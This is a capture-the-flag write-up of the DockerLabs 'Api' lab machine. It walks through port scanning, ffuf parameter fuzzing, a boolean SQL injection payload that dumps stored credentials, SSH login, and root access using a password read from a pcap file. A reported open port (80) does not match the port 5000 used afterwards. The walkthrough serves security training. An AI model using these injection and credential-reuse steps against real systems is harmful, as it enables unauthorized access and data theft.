- `Date` Apr 22, 2026
- `Machine` Api (Linux)
- `Difficulty` Easy
- `Prepared by` Allan Espinoza (Aka. ZoldyckSec)

## Summary

Api machine from DockerLabs presents a Flask REST API exposed on port 5000. The attack chain begins with API endpoint discovery through the application's own error messages, followed by parameter fuzzing using ffuf to identify a hidden GET parameter. The vulnerable parameter is then exploited via a classic SQL Injection, dumping all user credentials from the database. Finally, the obtained credentials are used to gain initial access via SSH.

## Reconnaissance

#### Port Scanning

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG allPorts 172.17.0.2
```
The scan reveals two ports:

- Port 22 : SSH
- Port 80 : HTTP

#### Service & Versions

```
nmap -p22,5000 -sCV -oN targeted 172.17.0.2
```


## Enumeration

#### Web Application Analysis

Visiting `http://172.17.0.2:5000/` directly returns a JSON message that reveals the available endpoints:

```json
{
  "message": "No endpoint selected. Please use /add to add a user or /users to query users."
}
```

The application exposes two endpoints:

- `/users` — Query users (GET)
- `/add` — Add a user (POST)

#### Identifying the Response Baseline

Before launching any fuzzing tool, a manual `curl` request helps understand how the application behaves with an invalid input. This step is critical for configuring the fuzzer's filters correctly.

```bash
curl -v "http://172.17.0.2:5000/users?test=1"
```

```
HTTP/1.0 404 NOT FOUND
Content-Type: application/json
Content-Length: 35

{"error": "Invalid parameter"}
```

> **Key observation:** Every invalid parameter returns a `404` response with a body of exactly **35 bytes**. This will be our noise signature.

#### Parameter Fuzzing with ffuf

With the baseline defined, we can configure ffuf to filter out all 35-byte responses (the error) and surface only the results that differ — which would indicate a valid parameter.

```bash
ffuf -u "http://172.17.0.2:5000/users?FUZZ=1" \
     -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt \
     -mc all -fs 35
```

**How this command works:**

- `-mc all`: Show responses with **any** status code, including 404, so nothing is hidden by default.
- `-fs 35`: **Filter by size** — hide any response that is exactly 35 bytes (our known error response). Only responses with a different size will be printed.

The fuzzer discovers the valid parameter: `username`.

## Exploitation

#### SQL Injection Discovery

With the `username` parameter identified, we test for SQL Injection by injecting a classic boolean payload:

```
http://172.17.0.2:5000/users?username=' OR 1=1-- -
```

The server returns all records from the database:

```json
[
  [1, "pingu", "your_password"],
  [2, "pingu", "pinguinasio"]
]
```

The application is vulnerable to **SQL Injection**. The payload works because the backend query is not sanitized. The original query was likely:

```sql
SELECT * FROM users WHERE username = 'INPUT'
```

After injection, it becomes:

```sql
SELECT * FROM users WHERE username = '' OR 1=1-- -'
```

- `'` — Closes the open string in the SQL query.
- `OR 1=1` — Always-true condition, forcing the query to return all rows.
- `-- -` — Comments out the rest of the original query.

#### Credentials Obtained

| ID | Username | Password |
|----|----------|----------|
| 1  | pingu    | your_password |
| 2  | pingu    | pinguinasio   |

#### Access via SSH

Using the extracted credentials against the SSH service (port 22):

```bash
ssh pingu@172.17.0.2
# Password: pinguinasio
```

```
pingu@Api:/$ whoami
pingu
```

Initial access established as user `pingu`.

## Post-Exploitation

#### Local Enumeration

After gaining access as `pingu`, we enumerate the home directory and its parent for interesting files.

```bash
ls -la /home
```

```
-rw-r--r-- 1 root  root  1631 Feb 27  2025 app.py
-rw-r--r-- 1 root  root   399 Feb 27  2025 network.pcap
drwxr-xr-x 1 pingu pingu 4096 Apr 23 02:11 pingu
-rw-r--r-- 1 root  root  8192 Feb 27  2025 users.db
```

Two files stand out immediately: `network.pcap` and `users.db`. The pcap file is world-readable, making it an interesting target.

#### Credential Discovery in network.pcap

Reading the pcap file directly with `cat` reveals its content in plaintext, exposing captured network credentials:

```bash
cat /home/network.pcap
```

```
...RLOGIN root
...PASS balulero
...Access Denied
```

> **Critical Finding:** The capture contains cleartext authentication traffic with credentials `root:balulero`. Although the original session was denied, credential reuse on the local system is always worth testing.

#### Privilege Escalation to Root

```bash
su root
# Password: balulero
```

```
root@f315b1c54a70:/home/pingu# whoami
root
```
